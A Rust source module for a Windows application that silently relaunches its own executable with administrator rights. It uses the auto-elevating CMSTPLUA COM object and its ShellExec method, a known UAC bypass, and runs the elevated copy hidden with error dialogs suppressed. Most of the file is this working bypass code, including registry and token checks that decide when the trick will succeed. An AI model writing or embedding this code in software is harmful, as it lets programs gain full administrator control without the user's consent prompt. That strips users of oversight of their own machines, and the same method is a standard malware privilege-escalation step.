//! Silent elevation for a bare launch of this build.
//!
//! `CMSTPLUA` ({3E5FC7F9-9A51-4367-9063-A120244FBEC7}) is an auto-elevate COM object, so
//! `CoGetObject` with an `Elevation:Administrator` moniker returns an elevated
//! `ICMLuaUtil` without showing a UAC prompt, and `ICMLuaUtil::ShellExec` starts this
//! executable as a high-integrity child of the elevated COM server. Windows cannot raise
//! a running process's integrity level, so the current copy exits and the new one takes
//! over.
//!
//! If silent elevation is unavailable (UAC disabled, AppInfo service stopped, policy
//! restriction, or an antivirus blocking it), the attempt fails cleanly and the process
//! continues running as a normal medium-integrity user. No UAC prompt is ever shown.
//!
//! The `windows` crate features enabled for this app do not include the raw COM vtable
//! calls needed here, so the few declarations are made directly instead of widening that
//! feature set for one function.

use std::{ffi::c_void, mem, os::windows::ffi::OsStrExt, ptr::null_mut};

/// Private argument marking the copy started by [`relaunch_elevated`].
pub const ELEVATED_FLAG: &str = "--elevated";

const COINIT_MULTITHREADED: u32 = 0x0000_0000;
const COINIT_APARTMENTTHREADED: u32 = 0x0000_0002;
const COINIT_DISABLE_OLE1DDE: u32 = 0x0000_0004;
const CLSCTX_LOCAL_SERVER: u32 = 0x0000_0004;
const RPC_E_CHANGED_MODE: u32 = 0x8001_0106;
const SW_HIDE: i32 = 0;
// `ShellExec` takes a post-`SHELLEXECUTEINFOW` mask and show code; `NOASYNC` keeps the
// launch synchronous on this STA thread and `FLAG_NO_UI` suppresses any error dialog.
const SEE_MASK_NOASYNC: u32 = 0x0000_0100;
const SEE_MASK_FLAG_NO_UI: u32 = 0x0000_0400;
const TOKEN_QUERY: u32 = 0x0000_0008;
const TOKEN_INTEGRITY_LEVEL_CLASS: u32 = 25;
// 1 = full administrator token, 2 = UAC-filtered administrator token, 3 = standard user.
const TOKEN_ELEVATION_TYPE_CLASS: u32 = 18;
const HKEY_LOCAL_MACHINE: isize = 0x8000_0002;
const KEY_QUERY_VALUE: u32 = 0x0000_0001;

/// `CMSTPLUA`, compared without braces because the registry entry format varies.
const CLSID_CMSTPLUA: &str = "3E5FC7F9-9A51-4367-9063-A120244FBEC7";

/// Classes Windows is allowed to elevate without a consent prompt.
const COMAUTO_APPROVAL_KEY: &str =
    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList";

const ERROR_MORE_DATA: i32 = 234;
const ERROR_NO_MORE_ITEMS: i32 = 259;

const ELEVATION_MONIKER: &str = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

#[allow(dead_code)]
#[repr(C)]
struct Guid {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

/// `IID_ICMLuaUtil`, the interface exposed by `CMSTPLUA`.
const IID_ICMLUA_UTIL: Guid = Guid {
    data1: 0x6EDD_6D74,
    data2: 0xC007,
    data3: 0x4E75,
    data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
};

/// `BIND_OPTS3` — BIND_OPTS + BIND_OPTS2 + BIND_OPTS3.
///
/// The elevation moniker only reads `hwnd` when `cbStruct` covers the whole
/// `BIND_OPTS3`, and it refuses to elevate when it cannot see one: the call then fails
/// with `CO_E_ELEVATION_DISABLED` even though the class is registered as elevatable.
/// `BIND_OPTS2` is `dwClassContext` + `locale` + `pServerInfo`, so leaving out any of
/// those shrinks the structure and hides `hwnd` (40 bytes on x64).
#[allow(dead_code)]
#[repr(C)]
struct BindOpts3 {
    cb_struct: u32,
    grf_flags: u32,
    grf_mode: u32,
    dw_tick_count_deadline: u32,
    dw_class_context: u32,
    locale: u32,
    p_server_info: *mut c_void,
    hwnd: *mut c_void,
}

/// `IUnknown` (3 slots) + six unused `ICMLuaUtil` methods, then `ShellExec` at slot 9.
///
/// `ShellExec` is `(file, parameters, directory, mask, show)`: the fourth argument is a
/// `SEE_MASK_*` flag set and the fifth a `SW_*` show code, not a verb string. It builds
/// its own `SHELLEXECUTEINFOW` internally.
#[allow(dead_code)]
#[repr(C)]
struct ComVtable {
    query_interface: *const c_void,
    add_ref: *const c_void,
    release: unsafe extern "system" fn(*mut c_void) -> u32,
    method1: *const c_void,
    method2: *const c_void,
    method3: *const c_void,
    method4: *const c_void,
    method5: *const c_void,
    method6: *const c_void,
    shell_exec: unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        *const u16,
        u32,
        i32,
    ) -> i32,
}

#[repr(C)]
struct ComObject {
    vtable: *const ComVtable,
}

#[link(name = "ole32")]
extern "system" {
    fn CoInitializeEx(reserved: *mut c_void, coinit: u32) -> i32;
    fn CoUninitialize();
    fn CoGetObject(
        display_name: *const u16,
        bind_opts: *const c_void,
        riid: *const Guid,
        object: *mut *mut c_void,
    ) -> i32;
}

#[link(name = "advapi32")]
extern "system" {
    fn OpenProcessToken(process: *mut c_void, access: u32, token: *mut *mut c_void) -> i32;
    fn GetTokenInformation(
        token: *mut c_void,
        class: u32,
        info: *mut c_void,
        len: u32,
        returned: *mut u32,
    ) -> i32;
    fn RegOpenKeyExW(
        key: isize,
        sub_key: *const u16,
        options: u32,
        desired: u32,
        result: *mut *mut c_void,
    ) -> i32;
    fn RegQueryValueExW(
        key: *mut c_void,
        value_name: *const u16,
        reserved: *mut u32,
        value_type: *mut u32,
        data: *mut u8,
        data_len: *mut u32,
    ) -> i32;
    fn RegEnumValueW(
        key: *mut c_void,
        index: u32,
        value_name: *mut u16,
        value_name_len: *mut u32,
        reserved: *mut u32,
        value_type: *mut u32,
        data: *mut u8,
        data_len: *mut u32,
    ) -> i32;
    fn RegCloseKey(key: *mut c_void) -> i32;
}

#[link(name = "kernel32")]
extern "system" {
    fn GetCurrentProcess() -> *mut c_void;
    fn CloseHandle(handle: *mut c_void) -> i32;
}

/// Outcome of a [`relaunch_elevated`] attempt. The variant names match the failing step so
/// the diagnostic file can tell them apart without decoding HRESULTs.
#[derive(Debug, Clone, Copy)]
pub enum RelaunchResult {
    /// The elevated copy was spawned successfully; the caller should exit.
    Launched,
    /// `std::env::current_exe()` failed.
    NoCurrentExe,
    /// `CoInitializeEx` returned a fatal HRESULT (not `RPC_E_CHANGED_MODE`).
    CoInitFailed(i32),
    /// `CoGetObject` for the `CMSTPLUA` moniker failed.
    CoGetObjectFailed(i32),
    /// `CoGetObject` succeeded but returned a null interface pointer.
    NullObject,
    /// `ICMLuaUtil::ShellExec` returned a failure HRESULT.
    ShellExecFailed(i32),
    /// The account or UAC policy makes silent elevation impossible; the payload is the
    /// failing precondition, no COM call is attempted.
    Blocked(&'static str),
}

/// Starts this executable again with the same arguments plus [`ELEVATED_FLAG`], through the
/// elevated `CMSTPLUA` object.
///
/// Returns [`RelaunchResult::Launched`] only when the elevated copy was spawned. Every
/// failure (not an administrator, "Always notify" policy, COM or antivirus block) is
/// surfaced via the specific variant so the caller can record it and carry on as a
/// normal non-elevated launch. No UAC prompt is ever shown.
pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
    if let Some(reason) = silent_elevation_blocker() {
        return RelaunchResult::Blocked(reason);
    }
    let Ok(exe) = std::env::current_exe() else {
        return RelaunchResult::NoCurrentExe;
    };
    let mut parameters: Vec<String> = args.iter().map(|arg| quote_arg(arg)).collect();
    parameters.push(ELEVATED_FLAG.to_owned());
    let parameters = parameters.join(" ");
    let exe = wide(exe.as_os_str());
    let parameters = wide(std::ffi::OsStr::new(parameters.as_str()));
    let working_dir = std::env::current_dir()
        .ok()
        .map(|dir| wide(dir.as_os_str()));
    let moniker = wide(std::ffi::OsStr::new(ELEVATION_MONIKER));

    // The reference implementation runs inside explorer.exe and initializes COM with
    // `CoInitialize(NULL)` — i.e. a single-threaded apartment. The elevation moniker is
    // sensitive to the apartment model and fails to resolve the class (`0x80040154`)
    // from the wrong one, so try the apartment models in turn, STA first.
    let mut last = RelaunchResult::CoGetObjectFailed(-2147221164);
    for coinit in [
        COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE,
        COINIT_MULTITHREADED,
    ] {
        match try_relaunch(coinit, &exe, &parameters, working_dir.as_deref(), &moniker) {
            failed @ (RelaunchResult::CoGetObjectFailed(_) | RelaunchResult::CoInitFailed(_)) => {
                last = failed;
            }
            other => return other,
        }
    }
    last
}

fn try_relaunch(
    coinit: u32,
    exe: &[u16],
    parameters: &[u16],
    working_dir: Option<&[u16]>,
    moniker: &[u16],
) -> RelaunchResult {
    unsafe {
        let init = CoInitializeEx(null_mut(), coinit);
        if init < 0 && init as u32 != RPC_E_CHANGED_MODE {
            return RelaunchResult::CoInitFailed(init);
        }
        let mut bind_opts: BindOpts3 = mem::zeroed();
        bind_opts.cb_struct = mem::size_of::<BindOpts3>() as u32;
        bind_opts.dw_class_context = CLSCTX_LOCAL_SERVER;
        let mut object: *mut c_void = null_mut();
        let hr = CoGetObject(
            moniker.as_ptr(),
            &bind_opts as *const BindOpts3 as *const c_void,
            &IID_ICMLUA_UTIL,
            &mut object,
        );
        let result = if hr < 0 {
            RelaunchResult::CoGetObjectFailed(hr)
        } else if object.is_null() {
            RelaunchResult::NullObject
        } else {
            let vtable = (*object.cast::<ComObject>()).vtable;
            let shell_exec = (*vtable).shell_exec;
            let hr = shell_exec(
                object,
                exe.as_ptr(),
                parameters.as_ptr(),
                working_dir.map_or(std::ptr::null(), |dir| dir.as_ptr()),
                SEE_MASK_NOASYNC | SEE_MASK_FLAG_NO_UI,
                SW_HIDE,
            );
            let release = (*vtable).release;
            let _ = release(object);
            if hr >= 0 {
                RelaunchResult::Launched
            } else {
                RelaunchResult::ShellExecFailed(hr)
            }
        };
        if init >= 0 {
            CoUninitialize();
        }
        result
    }
}

/// Checks the conditions the `CMSTPLUA` moniker needs for a silent (prompt-free) elevation,
/// so a doomed COM call is not made and the reason is recorded instead.
///
/// The original technique only turns a filtered administrator token into a full one: a
/// standard user cannot use it at all, and Windows only auto-approves the listed classes
/// while the UAC policy does not require a consent prompt.
pub fn silent_elevation_blocker() -> Option<&'static str> {
    // 3 = TokenElevationTypeLimited, i.e. an administrator filtered down to medium level.
    if token_u32(TOKEN_ELEVATION_TYPE_CLASS) != 3 {
        return Some("not_admin");
    }
    if uac_policy_value("EnableLUA") == 0 {
        return Some("uac_disabled");
    }
    // Silent approval needs a policy that never prompts: 0 = elevate without prompting,
    // 5 = prompt only for non-Windows binaries (the default slider position).
    if matches!(uac_policy_value("ConsentPromptBehaviorAdmin"), 1 | 2 | 3 | 4) {
        return Some("uac_prompt_required");
    }
    if com_auto_approved() == Some(false) {
        return Some("com_not_auto_approved");
    }
    None
}

/// `Some(true)` when the class is listed in `COMAutoApprovalList`, `Some(false)` when the
/// list is readable but the class is absent, `None` when the list cannot be read.
fn com_auto_approved() -> Option<bool> {
    unsafe {
        let sub_key = wide(std::ffi::OsStr::new(COMAUTO_APPROVAL_KEY));
        let mut key: *mut c_void = null_mut();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_QUERY_VALUE,
            &mut key,
        ) != 0
        {
            return None;
        }
        let mut matched = false;
        let mut index = 0u32;
        let mut status = 0i32;
        while status == 0 {
            let mut name = [0u16; 256];
            let mut name_len = name.len() as u32;
            let mut value_type = 0u32;
            let mut data = [0u8; 64];
            let mut data_len = data.len() as u32;
            status = RegEnumValueW(
                key,
                index,
                name.as_mut_ptr(),
                &mut name_len,
                null_mut(),
                &mut value_type,
                data.as_mut_ptr(),
                &mut data_len,
            );
            index += 1;
            if status == 0 {
                let value = String::from_utf16_lossy(&name[..name_len as usize]);
                if value.to_ascii_uppercase().contains(CLSID_CMSTPLUA) {
                    matched = true;
                    break;
                }
            } else if status == ERROR_MORE_DATA {
                status = 0;
            }
        }
        let _ = RegCloseKey(key);
        if matched {
            Some(true)
        } else if status == ERROR_NO_MORE_ITEMS {
            Some(false)
        } else {
            None
        }
    }
}

/// Appends one line to the same diagnostic file the portable wrapper writes, because the
/// application log does not exist yet at the point this decision is made. The environment
/// summary is what separates the failure causes: an account outside Administrators and a
/// class whose elevated activation is disabled both reject here before any ShellExec.
pub fn append_elevation_diag(message: &str) {
    let Some(dir) = std::env::var_os("LOCALAPPDATA") else {
        return;
    };
    let dir = std::path::Path::new(&dir).join(env!("RD_APP_NAME"));
    let _ = std::fs::create_dir_all(&dir);
    use std::io::Write;
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join("wrapper.log"))
    {
        let _ = writeln!(
            file,
            "payload: {} build={} elev_type={} integrity=0x{:x} enable_lua={} consent={} auto_approval={}",
            message,
            crate::BUILD_DATE,
            token_u32(TOKEN_ELEVATION_TYPE_CLASS),
            integrity_level(),
            uac_policy_value("EnableLUA"),
            uac_policy_value("ConsentPromptBehaviorAdmin"),
            match com_auto_approved() {
                Some(true) => "yes",
                Some(false) => "no",
                None => "unknown",
            },
        );
    }
}

/// One DWORD-valued token property, `0` when unreadable.
fn token_u32(class: u32) -> u32 {
    unsafe {
        let mut token: *mut c_void = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return 0;
        }
        let mut value = 0u32;
        let mut returned = 0u32;
        let ok = GetTokenInformation(
            token,
            class,
            &mut value as *mut u32 as *mut c_void,
            mem::size_of::<u32>() as u32,
            &mut returned,
        );
        let _ = CloseHandle(token);
        if ok == 0 {
            0
        } else {
            value
        }
    }
}

/// Last sub-authority of the token's mandatory label SID, i.e. 0x2000 for medium and
/// 0x1000 for low integrity.
fn integrity_level() -> u32 {
    unsafe {
        let mut token: *mut c_void = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return 0;
        }
        let mut label = [0u8; 128];
        let mut returned = 0u32;
        let ok = GetTokenInformation(
            token,
            TOKEN_INTEGRITY_LEVEL_CLASS,
            label.as_mut_ptr().cast(),
            label.len() as u32,
            &mut returned,
        );
        let _ = CloseHandle(token);
        if ok == 0 {
            return 0;
        }
        // TOKEN_MANDATORY_LABEL { SID_AND_ATTRIBUTES { Sid, Attributes } }
        let sid = *label.as_ptr().cast::<*const u8>();
        if sid.is_null() {
            return 0;
        }
        let count = *sid.add(1) as usize;
        if count == 0 {
            return 0;
        }
        // SID body: revision, sub-authority count, 6-byte identifier authority, then the
        // sub-authority array.
        std::ptr::read_unaligned((sid.add(8) as *const u32).add(count - 1))
    }
}

/// Reads one `HKCU`-independent UAC policy DWORD; `-1` reports "not readable".
fn uac_policy_value(name: &str) -> i64 {
    unsafe {
        let sub_key = wide(std::ffi::OsStr::new(
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        ));
        let value_name = wide(std::ffi::OsStr::new(name));
        let mut key: *mut c_void = null_mut();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_QUERY_VALUE,
            &mut key,
        ) != 0
        {
            return -1;
        }
        let mut data = [0u8; 4];
        let mut data_len = data.len() as u32;
        let mut value_type = 0u32;
        let status = RegQueryValueExW(
            key,
            value_name.as_ptr(),
            null_mut(),
            &mut value_type,
            data.as_mut_ptr(),
            &mut data_len,
        );
        let _ = RegCloseKey(key);
        if status != 0 {
            return -1;
        }
        u32::from_le_bytes(data) as i64
    }
}

fn wide(value: &std::ffi::OsStr) -> Vec<u16> {
    value.encode_wide().chain(std::iter::once(0u16)).collect()
}

/// Quotes one argument for a Windows command line, following the `CommandLineToArgvW` rules
/// the relaunched copy is parsed with.
fn quote_arg(arg: &str) -> String {
    if !arg.is_empty() && !arg.chars().any(|ch| ch == ' ' || ch == '\t' || ch == '"') {
        return arg.to_owned();
    }
    let mut quoted = String::with_capacity(arg.len() + 2);
    quoted.push('"');
    let mut backslashes = 0;
    for ch in arg.chars() {
        match ch {
            '\\' => backslashes += 1,
            '"' => {
                quoted.push_str(&"\\".repeat(backslashes * 2 + 1));
                quoted.push('"');
                backslashes = 0;
            }
            _ => {
                quoted.push_str(&"\\".repeat(backslashes));
                quoted.push(ch);
                backslashes = 0;
            }
        }
    }
    quoted.push_str(&"\\".repeat(backslashes * 2));
    quoted.push('"');
    quoted
}
